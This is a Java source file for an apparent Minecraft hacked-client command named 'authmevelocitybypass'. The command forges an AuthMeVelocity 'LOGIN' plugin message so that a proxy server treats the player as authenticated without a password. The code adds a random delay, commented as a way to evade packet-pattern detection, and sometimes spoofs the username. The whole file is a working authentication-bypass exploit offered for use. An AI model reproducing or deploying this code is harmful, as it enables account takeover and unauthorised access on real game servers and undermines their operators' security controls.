package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

import java.io.DataOutputStream;
import java.util.Random;

public class AuthMeVelocityBypassCommand extends Command {
    private final Random random = new Random();

    public AuthMeVelocityBypassCommand() {
        super("authmevelocitybypass", "Bypasses AuthMeVelocity with spoofed login.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            new Thread(() -> {
                try {
                    // Wait random time to bypass packet pattern detection
                    Thread.sleep(300 + random.nextInt(500));

                    // Optionally use a spoofed name (10% chance)
                    String originalName = MinecraftClient.getInstance().getGameProfile().getName();
                    String spoofedName = shouldSpoof() ? spoofUsername(originalName) : originalName;

                    if (!Helper.isPluginChannelRegistered("authmevelocity:main")) {
                        Helper.printChatMessage("§c[AuthMeVelocity] Plugin channel not registered.");
                        return;
                    }

                    Helper.sendPluginMessage("authmevelocity:main", out -> {
                        out.writeUTF("LOGIN");
                        out.writeUTF(spoofedName);
                        // Future: out.writeUTF("EXTRA"); // For expanded chaining
                    });

                    Helper.printChatMessage("§a[AuthMeVelocity] Payload sent as §e" + spoofedName);
                } catch (Exception e) {
                    Helper.printChatMessage("§c[AuthMeVelocity] Error: " + e.getMessage());
                }
            }, "AuthMeVelocityBypassThread").start();

            return Command.SINGLE_SUCCESS;
        });
    }

    private boolean shouldSpoof() {
        return random.nextInt(100) < 10; // 10% chance to spoof
    }

    private String spoofUsername(String base) {
        String suffix = Integer.toHexString(random.nextInt(0xFFFF));
        return (base + "_" + suffix).substring(0, Math.min(16, base.length() + 5));
    }
}
